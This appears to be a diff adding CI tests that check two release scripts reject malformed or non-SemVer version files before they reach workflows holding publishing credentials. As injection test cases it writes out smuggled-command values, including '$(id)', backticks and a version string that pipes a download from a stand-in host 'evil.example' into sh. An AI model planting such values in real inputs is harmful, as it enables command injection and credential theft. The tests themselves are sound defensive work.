@@ -147,6 +147,122 @@ expect_name_reject "foo bar"
 expect_name_reject "../etc"
 expect_name_reject ""
 
+
+# ---------------------------------------------------------------------------------
+# read-version-file.sh: the guard for the versions detect-all-changes.sh does not
+# read (cli/version, scripts/bifrost-migration-cli/version, npx/bifrost-cli). Those
+# reach `run:` lines in release-cli.yml, release-bifrost-migration-cli.yml and
+# npx-publish.yml, in steps holding GH_TOKEN, R2 and npm credentials.
+# ---------------------------------------------------------------------------------
+
+READER="${SCRIPT_DIR}/read-version-file.sh"
+TMPDIR_VF="$(mktemp -d)"
+trap 'rm -rf "$TMPDIR_VF"' EXIT
+
+expect_file_accept() {
+  local path="$1" want="$2" out
+  out="$TMPDIR_VF/out"
+  : > "$out"
+  if GITHUB_OUTPUT="$out" "$READER" "$path" pkg >/dev/null 2>&1 \
+    && grep -qx "version=${want}" "$out" && grep -qx "full-tag=pkg/v${want}" "$out"; then
+    echo "  ok - reads $want from $(basename "$path")"
+    passed=$((passed + 1))
+  else
+    echo "FAIL: read-version-file.sh did not emit version=${want} for $(basename "$path")" >&2
+    failed=$((failed + 1))
+  fi
+}
+
+expect_file_reject() {
+  local path="$1" label="$2" out
+  out="$TMPDIR_VF/out"
+  : > "$out"
+  if GITHUB_OUTPUT="$out" "$READER" "$path" >/dev/null 2>&1 || [ -s "$out" ]; then
+    echo "FAIL: read-version-file.sh accepted $label" >&2
+    failed=$((failed + 1))
+  else
+    echo "  ok - read-version-file.sh rejects $label"
+    passed=$((passed + 1))
+  fi
+}
+
+printf '1.0.0\n' > "$TMPDIR_VF/version"
+expect_file_accept "$TMPDIR_VF/version" "1.0.0"
+printf '2.1.0-rc.1' > "$TMPDIR_VF/version"
+expect_file_accept "$TMPDIR_VF/version" "2.1.0-rc.1"
+printf '{"name":"x","version":"1.0.1"}' > "$TMPDIR_VF/package.json"
+expect_file_accept "$TMPDIR_VF/package.json" "1.0.1"
+
+printf '1.0.1$(id)\n' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version file holding $(id)'
+printf '1.0.1\nversion=9.9.9\n' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a multi-line version file'
+printf '1.0.1`id`' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version file holding backticks'
+printf '{"version":"1.0.1; curl evil.example|sh"}' > "$TMPDIR_VF/package.json"
+expect_file_reject "$TMPDIR_VF/package.json" 'a package.json version holding a command'
+printf '{"name":"x"}' > "$TMPDIR_VF/package.json"
+expect_file_reject "$TMPDIR_VF/package.json" 'a package.json with no version'
+expect_file_reject "$TMPDIR_VF/missing" 'a missing file'
+
+# Only the trailing line ending is stripped. Deleting every whitespace character
+# would join a split file into a version it never contained: "1.0.1" over "0"
+# would publish 1.0.10.
+printf '1.0.0\r\n' > "$TMPDIR_VF/version"
+expect_file_accept "$TMPDIR_VF/version" "1.0.0"
+printf '1.0.1\n0\n' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version split across lines (1.0.1 / 0)'
+printf '1.0.\n0' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version split across lines (1.0. / 0)'
+printf '1.0.1 0\n' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version holding a space'
+printf '1.0.\t1\n' > "$TMPDIR_VF/version"
+expect_file_reject "$TMPDIR_VF/version" 'a version holding a tab'
+
+# Strict SemVer 2.0.0: these feed npm publish, which refuses anything else, so
+# they are rejected here before a tag or release is created for them.
+for v in 1.0.0-0 1.0.0-alpha-1 1.0.0-x.7.z.92 1.0.0-0a.1 2.0.0+build.05 1.0.0-rc.1+sha.5114f85; do
+  printf '%s\n' "$v" > "$TMPDIR_VF/version"
+  expect_file_accept "$TMPDIR_VF/version" "$v"
+done
+for v in 1.0.0-.. 01.2.3 1.02.3 1.2.03 1.0.0-01 1.0.0-rc..1 1.0.0-rc. 1.0.0+build..1 1.0.0-rc_1; do
+  printf '%s\n' "$v" > "$TMPDIR_VF/version"
+  expect_file_reject "$TMPDIR_VF/version" "non-SemVer $v"
+done
+
+# extract-npx-version.sh reads npx/bifrost/package.json relative to the working
+# directory and feeds the other npm publish, so it gets the same SemVer matrix.
+NPX_EXTRACT="${SCRIPT_DIR}/extract-npx-version.sh"
+mkdir -p "$TMPDIR_VF/npx-root/npx/bifrost"
+expect_npx() {
+  local want="$1" v="$2" out="$TMPDIR_VF/npx-out" rc=0
+  : > "$out"
+  printf '{"name":"x","version":"%s"}' "$v" > "$TMPDIR_VF/npx-root/npx/bifrost/package.json"
+  (cd "$TMPDIR_VF/npx-root" && GITHUB_OUTPUT="$out" "$NPX_EXTRACT") >/dev/null 2>&1 || rc=$?
+  if [[ "$want" == accept && $rc -eq 0 ]] && grep -qx "version=${v}" "$out"; then
+    echo "  ok - extract-npx-version.sh accepts $v"; passed=$((passed + 1))
+  elif [[ "$want" == reject && $rc -ne 0 && ! -s "$out" ]]; then
+    echo "  ok - extract-npx-version.sh rejects $v"; passed=$((passed + 1))
+  else
+    echo "FAIL: extract-npx-version.sh should $want $v (rc=$rc)" >&2; failed=$((failed + 1))
+  fi
+}
+for v in 1.6.3 1.0.0-rc.1 1.0.0-0 2.0.0+build.05; do expect_npx accept "$v"; done
+for v in 1.0.0-.. 01.2.3 1.0.0-01 1.0.0-rc..1 '1.0.0$(id)'; do expect_npx reject "$v"; done
+
+# No workflow may read a version straight into GITHUB_OUTPUT: that is exactly the
+# shape release-cli.yml had before read-version-file.sh. Workflows read versions
+# through a validating script instead.
+raw_reads=$(grep -nE '\$\(cat [^)]*version\)|jq -r .\.version' "${SCRIPT_DIR}/../"*.yml || true)
+if [ -n "$raw_reads" ]; then
+  echo "FAIL: workflow reads a version without validating it; use scripts/read-version-file.sh:" >&2
+  echo "$raw_reads" >&2
+  failed=$((failed + 1))
+else
+  echo "  ok - no workflow reads a version file unvalidated"
+  passed=$((passed + 1))
+fi
+
 echo ""
 if [ "$failed" -ne 0 ]; then
   echo "$failed failed, $passed passed" >&2
